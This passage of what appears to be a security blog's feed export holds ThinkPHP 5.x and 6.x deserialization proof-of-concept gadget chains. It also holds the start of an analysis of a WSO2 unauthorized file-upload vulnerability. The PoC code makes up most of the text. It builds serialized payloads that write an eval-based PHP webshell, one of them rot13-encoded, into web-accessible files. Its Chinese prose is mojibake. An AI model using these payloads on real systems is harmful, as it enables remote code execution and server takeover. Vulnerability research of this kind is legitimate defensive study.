class="string">&#x27;&#x27;</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; tag = <span class="string">&#x27;armandhe&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcached</span> <span class="keyword">extends</span> <span class="title">Driver</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Memcached constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line">            <span class="string">&#x27;host&#x27;</span>     =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;port&#x27;</span>     =&gt; <span class="number">11211</span>,</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>   =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;timeout&#x27;</span>  =&gt; <span class="number">0</span>, <span class="comment">// è¶…æ—¶æ—¶é—´ï¼ˆå•ä½ï¼šæ¯«ç§’ï¼‰</span></span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//è´¦å·</span></span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="comment">//å¯†ç </span></span><br><span class="line">            <span class="string">&#x27;option&#x27;</span>   =&gt; [],</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; options[<span class="string">&#x27;expire&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; handler = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> <span class="keyword">extends</span> <span class="title">Driver</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * File constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; options = [</span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span>        =&gt; <span class="number">0</span>,</span><br><span class="line">                <span class="string">&#x27;cache_subdir&#x27;</span>  =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="literal">false</span>,</span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>          =&gt; <span class="string">&#x27;php://filter/write=string.rot13/resource=&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Memcache constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span>  = [</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; handler = <span class="keyword">new</span> <span class="title class_">Memcached</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; config = [</span><br><span class="line">                <span class="string">&#x27;host&#x27;</span>         =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="comment">// memcacheä¸»æœº</span></span><br><span class="line">                <span class="string">&#x27;port&#x27;</span>         =&gt; <span class="number">11211</span>, <span class="comment">// memcacheç«¯å£</span></span><br><span class="line">                <span class="string">&#x27;expire&#x27;</span>       =&gt; <span class="number">0</span>, <span class="comment">// sessionæœ‰æ•ˆæœŸ</span></span><br><span class="line">                <span class="string">&#x27;timeout&#x27;</span>      =&gt; <span class="number">0</span>, <span class="comment">// è¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆå•ä½ï¼šæ¯«ç§’ï¼‰</span></span><br><span class="line">                <span class="string">&#x27;persistent&#x27;</span>   =&gt; <span class="literal">true</span>, <span class="comment">// é•¿è¿æ¥</span></span><br><span class="line">                <span class="string">&#x27;session_name&#x27;</span> =&gt; <span class="string">&#x27;&lt;?cuc $n=fgegbhccre(&quot;_erdhrfg&quot;);riny($$n[&quot;pzq&quot;])?&gt;&#x27;</span>, <span class="comment">// memcache keyå‰ç¼€</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Output constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt;styles =[</span><br><span class="line">              <span class="string">&#x27;getAttr&#x27;</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; handle = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Relation</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * OneToOne constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; bindAttr = [</span><br><span class="line">                <span class="string">&quot;armandhenewpy&quot;</span></span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * HasOne constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Query constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; model = <span class="keyword">new</span> <span class="title class_">Output</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">db</span>\<span class="title class_">Query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Relation constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; selfRelation = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; query = <span class="keyword">new</span> <span class="title class_">Query</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Model constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; <span class="built_in">parent</span> = <span class="keyword">new</span> <span class="title class_">Output</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; append = [</span><br><span class="line">                <span class="string">&#x27;getError&#x27;</span></span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; error = <span class="keyword">new</span> <span class="title class_">HasOne</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Windows constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; files = [<span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">new</span> <span class="title class_">Pivot</span>()</span><br><span class="line"></span><br><span class="line">        ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Unserialization</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getpayload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>())));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>thinkphp</tag>
        <tag>PoC</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP6.xååºåˆ—åŒ–POC</title>
    <url>/archives/6bc452e1.html</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Adapter</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">AbstractAdapter</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">pathPrefix</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pathPrefix = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Local</span> <span class="keyword">extends</span> <span class="title">AbstractAdapter</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Adapter</span>\<span class="title class_">Local</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$autosave</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//        protected $complete = [];</span></span><br><span class="line"><span class="comment">//        protected $expire = null;</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$cache</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; autosave = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//            $this -&gt; complete = [&#x27;armandheddd&#x27; =&gt; &#x27;sdkfjdslfjsl&#x27;];</span></span><br><span class="line"><span class="comment">//            $this -&gt; expire = &#x27;noipi&#x27;;</span></span><br><span class="line">            <span class="variable language_">$this</span> -&gt; cache = [<span class="string">&quot;payload&quot;</span> =&gt; <span class="string">&quot;\&lt;?php @eval(\$_REQUEST[cmd])?&gt;&quot;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Adapter constructor.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; adapter = <span class="keyword">new</span> <span class="title class_">Local</span>();</span><br><span class="line">            <span class="variable language_">$this</span> -&gt; file = <span class="string">&#x27;D:/phpstudy_pro/WWW/tp/public/armandhenewpy.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">controller</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>\<span class="title class_">Adapter</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">createPayload</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createpayload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Adapter</span>())));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>thinkphp</tag>
        <tag>PoC</tag>
      </tags>
  </entry>
  <entry>
    <title>WOS2 å¤šæ¬¾äº§å“æœªæˆæƒä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€CVE-2022-29464ã€‘</title>
    <url>/archives/193abed6.html</url>
    <content><![CDATA[<p>å…¨å…¬å¸æœ€å¤§çš„é»‘é˜”åœ¨ç¾¤é‡Œå‘äº†ä¸€å¼ æˆªå›¾æ˜¯è€å¤–å‘çš„å…³äºè¿™ä¸ªæ¼æ´å¤ç°çš„æˆªå›¾ï¼Œäºæ˜¯æˆ‘æ˜¨å¤©çœ‹äº†å¾ˆä¹…ä»–çš„æºç ï¼Œå¼€å§‹è¿˜æ˜¯å¾ˆéš¾å—çš„ï¼Œå¯ä»¥çŸ¥é“çš„ä¿¡æ¯å°±æ˜¯è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œçœ‹äº†æœ€æ–°å‘å¸ƒçš„ç‰ˆæœ¬çš„ä¿®æ”¹</p>
<blockquote>
<p><a href="https://github.com/wso2/carbon-kernel/pull/3152/files">https://github.com/wso2/carbon-kernel/pull/3152/files</a></p>
</blockquote>
<span id="more"></span>
<p>è¿™éƒ¨åˆ†æ˜¯å¯¹æ–‡ä»¶ä¸Šä¼ çš„å®ç°ä»£ç çš„ä¿®æ”¹ï¼Œå…¶å®æˆ‘çœ‹äº†æ„Ÿè§‰è¿™å„¿å…¶å®è¿˜å¹¶ä¸é‡è¦ï¼Œå› ä¸ºä¹Ÿæ²¡ä¿®æ”¹å•¥å†…å®¹ï¼Œå¦ä¸€å¤„ä¿®æ”¹å°±æ˜¯æ·»åŠ äº†æƒé™éªŒè¯çš„ä»£ç </p>
<blockquote>
<p><a href="https://github.com/wso2/carbon-identity-framework/pull/3864/files">https://github.com/wso2/carbon-identity-framework/pull/3864/files</a></p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/61f6f3da8298c1792d1a080fc1988d13.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä¸€å¼€å§‹å¾ˆç–‘æƒ‘ï¼Œå› ä¸ºä¸çŸ¥é“è¿™é‡Œé¢æ¯ä¸ªæ ‡ç­¾çš„å…·ä½“åŠŸèƒ½ï¼Œæ ‡ç­¾å±æ€§çš„å®šä¹‰æ˜¯å•¥ï¼Œè¿™å°±å¾ˆæ— è€ã€‚è¿™åº”è¯¥æ˜¯ä¸€ä¸ªæƒé™æ§åˆ¶çš„xmlæ–‡ä»¶<br>resourceæ ‡ç­¾çš„contextä¸ºè·¯ç”±ï¼Œ securedä¸ºæ˜¯å¦å¼€å¯æƒé™è®¤è¯ï¼Œå¦‚æœä¸ºfalseçš„è¯åˆ™ä¸å¼€å¯ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æœªæˆæƒè®¿é—®ã€‚è¿™é‡Œæ³¨æ„åˆ°çº¢è‰²éƒ¨åˆ†ï¼Œå¯¹<code>&quot;(.*)/fileupload(.*)</code>çš„å®šä¹‰æ˜¯è®¾ç½®çš„ä¸º<code>false</code>çš„ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªæ¥å£æ˜¯å¯ä»¥æœªæˆæƒè®¿é—®çš„ï¼Œçœ‹åå­—å¾ˆæ˜æ˜¾æ˜¯ä¸€ä¸ªæœªæˆæƒè®¿é—®çš„æ¥å£ã€‚ä½†æ˜¯å…³äºè¿™ä¸ªæ¥å£çš„æ˜ å°„å…³ç³»ï¼Œæœ€ç»ˆè°ƒç”¨çš„æ˜¯å“ªä¸ªç±»æˆ‘å¼€å§‹ä¸€ç›´å¾ˆè¿·æƒ‘ï¼Œå› ä¸ºè¿™ä¸ªçš„é¡¹ç›®ç»“æ„æ²¡æœ‰æ¥è§¦è¿‡ï¼Œæ¯ä¸ªxmlæ–‡ä»¶çš„ä½œç”¨åŸŸè°ƒç”¨è¿‡ç¨‹æˆ‘éƒ½ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå°±å¾ˆçƒ¦ã€‚<br>æœ€æ–°ç‰ˆè¿˜æœ‰ä¸€å¤„ä¿®æ”¹å°±æ˜¯</p>
<blockquote>
<p><a href="https://github.com/wso2-extensions/identity-carbon-auth-rest/pull/167/files">https://github.com/wso2-extensions/identity-carbon-auth-rest/pull/167/files</a></p>
</blockquote>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e0f17ada21a096f036fe5b8dcef66711.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>é˜…è¯»ä»£ç å¯ä»¥å‘ç°å…¶å®å¹¶æ²¡æœ‰ä»€ä¹ˆæ‰“çš„å˜åŒ–ï¼Œè¿™é‡Œå°±æ˜¯åˆ¤æ–­cookieæ˜¯å¦æ˜¯æœ‰æ•ˆçš„ï¼Œæ¢äº†ä¸€ç§å®ç°æ–¹å¼è€Œå·²ï¼Œå¯¹æ¼æ´çš„ä¿®å¤æ„Ÿè§‰å½±å“ä¸å¤§ã€‚è¿™é‡Œå»åˆ°æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€å¤„çš„ä¿®æ”¹<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6009bcdcad8f0affccd116e95b3d615b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œåˆ é™¤äº†å¾ˆå¤šçš„æ˜ å°„å…³ç³»ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸¤ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ‰§è¡Œå™¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…¶å®å¯ä»¥å»çœ‹çœ‹è¿™è¿ä¸ªæ‰§è¡Œå™¨æ˜¯æ€ä¹ˆå†™çš„ï¼Œå½“ç„¶ç°åœ¨æˆ‘ä»¬ä¸çœ‹è¿™ä¸ªï¼Œè¿˜æœ‰å¦ä¸€ä¸ªæ–‡ä»¶è¢«ä¿®æ”¹äº†</p>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/5efcf5a4234b867a72be55dca8db4b41.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸»è¦çš„ä¿®æ”¹æœ‰ä¸¤å¤„<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8425b889449e7c0dae5a19361722a934.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œå¯¹<code>uploadFile</code>çš„èµ‹å€¼è¿›è¡Œäº†ä¿®æ”¹ï¼Œæ·»åŠ äº†ä¸€ä¸ªå‡½æ•°<code>verifyCanonicalDestination</code>å¯¹<code>fileName</code>è¿›è¡Œæ£€æŸ¥ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯æ–°å¢åŠ çš„ï¼Œ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/71238db3876c7a36f19eda14010c3118.png" 